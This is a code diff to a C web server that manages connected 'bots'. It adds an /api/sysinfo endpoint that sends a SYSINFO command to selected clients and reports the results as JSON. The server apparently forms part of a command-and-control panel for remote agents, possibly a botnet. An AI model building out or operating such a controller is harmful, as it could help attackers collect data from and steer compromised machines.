@@ -625,6 +625,8 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
             handle_get_cwd(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/update", hm->uri.len) == 0) {
             handle_update_bots(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/sysinfo", hm->uri.len) == 0) {
+            handle_sysinfo_bots(c, hm);
         } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
             serve_static_file(c, hm);
         } else {
@@ -808,4 +810,71 @@ void handle_update_bots(struct mg_connection *c, struct mg_http_message *hm) {
     output_log("Successfully sent update request to clients.\n", LOG_INFO, LOG_TO_ALL);
     cJSON_Delete(response_json);
     free(response_str);
+}
+
+void handle_sysinfo_bots(struct mg_connection *c, struct mg_http_message *hm){
+    char bot_ids[1024] = {0};
+
+    // Parse bot_ids from POST request (comma-separated)
+    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
+
+    if (strlen(bot_ids) == 0) {
+        output_log("Update request with no bots provided.\n", LOG_ERROR, LOG_TO_ALL);
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot IDs are required\"}");
+        return;
+    }
+    // Step 2: Loop over each bot ID and perform update
+    size_t getsysinfo = 0;
+    cJSON *results_array = cJSON_CreateArray();
+
+    char *bot_id = strtok(bot_ids, ",");
+    while (bot_id != NULL) {
+        // Trim whitespace
+        while (*bot_id == ' ' || *bot_id == '\t') bot_id++;
+
+        Client *client = find_client(&hash_table, bot_id);
+        cJSON *result = cJSON_CreateObject();
+        cJSON_AddStringToObject(result, "bot_id", bot_id);
+
+        if (client && client->state == LISTENING && client->socket > 0) {
+            // Create and send SYSINFO command
+            Command cmd = {
+                .cmd_id = "SYSINFO",
+                .order_type = SYSINFO,
+                .delay = 0,
+                .program = strdup("SYSINFO"),
+                .expected_exit_code = 0,
+                .params = malloc(2* sizeof(char *)) 
+            };
+            cmd.params[0] = strdup("");
+            cmd.params[1] = NULL; // No params needed, NULL terminated
+
+            if (send_command(client->socket, &cmd) == 0) {
+                    cJSON_AddStringToObject(result, "status", "success");
+                    getsysinfo++;
+                } 
+                else {
+                    cJSON_AddStringToObject(result, "status", "failed to send sysinfo command");
+                }
+                free_command(&cmd);
+        } 
+        else {
+            cJSON_AddStringToObject(result, "status", "client not found or not listening");
+        }
+        
+        cJSON_AddItemToArray(results_array, result);
+        bot_id = strtok(NULL, ",");
+    }
+
+    cJSON *response_json = cJSON_CreateObject();
+    cJSON_AddStringToObject(response_json, "status", "done");
+    cJSON_AddNumberToObject(response_json, "sent", getsysinfo);
+    cJSON_AddItemToObject(response_json, "results", results_array);
+
+    char *response_str = cJSON_PrintUnformatted(response_json);
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
+    output_log("Successfully sent sysinfo request to clients.\n", LOG_INFO, LOG_TO_ALL);
+    cJSON_Delete(response_json);
+    free(response_str);
+
 }
